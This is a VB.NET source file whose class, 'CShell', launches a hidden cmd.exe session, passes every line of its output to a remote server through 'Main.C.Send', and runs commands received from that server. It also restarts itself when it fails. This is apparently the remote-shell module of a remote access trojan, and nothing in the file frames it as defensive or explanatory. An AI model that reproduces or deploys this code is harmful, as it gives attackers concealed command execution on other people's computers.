Public Class CShell
    Dim prc As System.Diagnostics.Process
    Public readr As Boolean = False

    Public Sub createsession()
        prc = New System.Diagnostics.Process()
        Dim info As System.Diagnostics.ProcessStartInfo = New System.Diagnostics.ProcessStartInfo
        info.UseShellExecute = False
        info.RedirectStandardInput = True
        info.RedirectStandardOutput = True
        info.RedirectStandardError = True
        info.CreateNoWindow = True
        info.Arguments = "/K"
        info.WorkingDirectory = "C:\"
        info.FileName = "cmd.exe"
        prc.StartInfo = info
        prc.Start()
        readr = True
        Dim read As System.Threading.Thread = New System.Threading.Thread(AddressOf redirect)
        read.IsBackground = True
        read.Start()
    End Sub

    Public Sub closesession()
        readr = False
        prc.Kill()
        ''killshell send message to server
    End Sub

    Sub redirect()
        Try
            Dim oStreamReader As System.IO.StreamReader
            While readr
                While True
                    Dim line As String = ""
                    oStreamReader = prc.StandardOutput
                    line = oStreamReader.ReadLine()
                    If String.IsNullOrEmpty(line) Then
                        Exit While
                    End If
                    Main.C.Send(Main.n.getshell & Main.Sep & line)
                End While
            End While
        Catch
            createsession()
        End Try
    End Sub

    Public Sub execute(ByVal code As String)
        If code <> "exit" Then
            prc.StandardInput.WriteLine(code)
            prc.StandardInput.WriteLine()
            prc.StandardInput.Flush()
        Else
            closesession()
        End If
    End Sub
End Class
